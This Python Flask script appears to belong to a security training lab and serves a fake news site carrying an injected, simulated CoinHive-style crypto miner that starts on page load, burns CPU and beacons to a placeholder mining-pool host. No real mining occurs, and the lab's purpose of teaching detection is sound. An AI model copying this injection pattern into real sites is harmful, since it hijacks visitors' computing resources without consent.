#!/usr/bin/env python3
"""
Scenario 19: Compromised Website with Embedded Crypto Miner.

Serves a Flask web app simulating a legitimate website that has been
compromised with an injected coinhive-style JavaScript crypto miner.

WARNING: This application is for EDUCATIONAL purposes only.
It does NOT perform actual cryptocurrency mining.
"""

import os
import sys

from flask import Flask, render_template_string

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", ".."))

from wcace_lib.constants import MINING_POOL_DOMAIN, MINING_POOL_IP

app = Flask(__name__)

# ============================================================
# Simulated coinhive-style miner JS (no actual mining occurs)
# ============================================================
MINER_JS = f"""
<script>
// === SIMULATED CRYPTO MINER (Educational Only) ===
// This simulates the network behavior and CPU usage patterns
// of a browser-based cryptocurrency miner like CoinHive.
// NO actual mining takes place.

var CoinHive = {{
    CONFIG: {{
        POOL_URL: "wss://{MINING_POOL_DOMAIN}:443/proxy",
        STRATUM_URL: "stratum+tcp://{MINING_POOL_IP}:3333",
        SITE_KEY: "a1b2c3d4e5f6g7h8i9j0SimulatedKey",
        THROTTLE: 0.3,
        THREADS: navigator.hardwareConcurrency || 4,
    }},

    _running: false,
    _hashCount: 0,
    _startTime: null,

    start: function() {{
        if (this._running) return;
        this._running = true;
        this._startTime = Date.now();
        console.log("[CoinHive] Miner started - Site Key: " + this.CONFIG.SITE_KEY);
        console.log("[CoinHive] Pool: " + this.CONFIG.POOL_URL);
        console.log("[CoinHive] Threads: " + this.CONFIG.THREADS);
        this._simulateMining();
    }},

    stop: function() {{
        this._running = false;
        console.log("[CoinHive] Miner stopped. Total hashes: " + this._hashCount);
    }},

    _simulateMining: function() {{
        var self = this;
        if (!self._running) return;

        // Simulate hash computation (CPU busy-work, NOT real mining)
        var iterations = 50000;
        var dummy = 0;
        for (var i = 0; i < iterations; i++) {{
            dummy = Math.sin(i) * Math.cos(i) + Math.sqrt(i);
        }}
        self._hashCount += iterations;

        // Simulate pool check-in beacon every ~30 seconds
        var elapsed = (Date.now() - self._startTime) / 1000;
        if (Math.floor(elapsed) % 30 === 0 && elapsed > 1) {{
            console.log("[CoinHive] Pool check-in: " + self._hashCount + " hashes submitted");
            // Simulated XHR to mining pool (will fail - no real pool)
            try {{
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "http://{MINING_POOL_DOMAIN}/api/v1/submit", true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify({{
                    "type": "submit",
                    "params": {{
                        "id": self.CONFIG.SITE_KEY,
                        "job_id": "sim_" + Math.random().toString(36).substr(2, 8),
                        "nonce": Math.floor(Math.random() * 0xFFFFFFFF).toString(16),
                        "result": Array(64).fill(0).map(() => Math.floor(Math.random()*16).toString(16)).join("")
                    }}
                }}));
            }} catch(e) {{ /* expected to fail */ }}
        }}

        // Continue mining loop
        setTimeout(function() {{ self._simulateMining(); }}, 100);
    }},

    getHashesPerSecond: function() {{
        if (!this._startTime) return 0;
        var elapsed = (Date.now() - this._startTime) / 1000;
        return Math.floor(this._hashCount / elapsed);
    }}
}};

// Auto-start miner when page loads (typical cryptojacking behavior)
document.addEventListener("DOMContentLoaded", function() {{
    CoinHive.start();
}});
</script>
"""

# ============================================================
# Website HTML template (looks like a normal news site)
# ============================================================
WEBSITE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Daily News Portal</title>
    <style>
        body {{ font-family: Georgia, serif; max-width: 800px; margin: 0 auto; padding: 20px; background: #f5f5f5; }}
        .header {{ background: #2c3e50; color: white; padding: 20px; margin-bottom: 20px; }}
        .header h1 {{ margin: 0; }}
        .article {{ background: white; padding: 20px; margin-bottom: 15px; border-left: 4px solid #3498db; }}
        .article h2 {{ color: #2c3e50; margin-top: 0; }}
        .article .meta {{ color: #999; font-size: 0.9em; }}
        .footer {{ text-align: center; color: #999; padding: 20px; font-size: 0.8em; }}
        /* WARNING BANNER - only visible in this demo */
        .demo-warning {{ background: #e74c3c; color: white; padding: 10px; text-align: center; font-family: monospace; font-size: 0.9em; }}
    </style>
</head>
<body>
    <div class="demo-warning">
        WCACE Scenario 19 - SIMULATED COMPROMISED WEBSITE - Educational Use Only
    </div>

    <div class="header">
        <h1>Daily News Portal</h1>
        <p>Your trusted source for breaking news</p>
    </div>

    <div class="article">
        <h2>Technology Sector Reports Record Growth</h2>
        <p class="meta">Published: February 18, 2026 | Technology</p>
        <p>Major technology companies reported significant growth in the latest quarter,
        driven by advances in artificial intelligence and cloud computing services.
        Analysts expect the trend to continue through the end of the fiscal year.</p>
    </div>

    <div class="article">
        <h2>Global Climate Summit Reaches New Agreement</h2>
        <p class="meta">Published: February 17, 2026 | Environment</p>
        <p>World leaders gathered for the annual climate summit have reached a
        landmark agreement on reducing carbon emissions. The deal includes binding
        targets for the world's largest economies.</p>
    </div>

    <div class="article">
        <h2>Sports Championship Finals This Weekend</h2>
        <p class="meta">Published: February 16, 2026 | Sports</p>
        <p>The championship finals are set for this weekend as the top two teams
        prepare for what promises to be an exciting matchup. Ticket sales have
        broken all previous records.</p>
    </div>

    <div class="footer">
        <p>&copy; 2026 Daily News Portal. All rights reserved.</p>
    </div>

    <!-- INJECTED CRYPTO MINER (this is the malicious payload) -->
    """ + MINER_JS + """
</body>
</html>
"""


@app.route("/")
def index():
    """Serve the compromised website with injected miner."""
    return render_template_string(WEBSITE_HTML)


@app.route("/api/status")
def status():
    """Legitimate-looking API endpoint."""
    return {"status": "ok", "articles": 3}


@app.route("/health")
def health():
    return {"status": "healthy"}


if __name__ == "__main__":
    print("[*] Compromised website starting on http://localhost:5019")
    print("[!] WARNING: This site contains a simulated crypto miner JS payload")
    print(f"[*] Simulated mining pool: {MINING_POOL_DOMAIN} ({MINING_POOL_IP})")
    app.run(host="0.0.0.0", port=5019, debug=False)
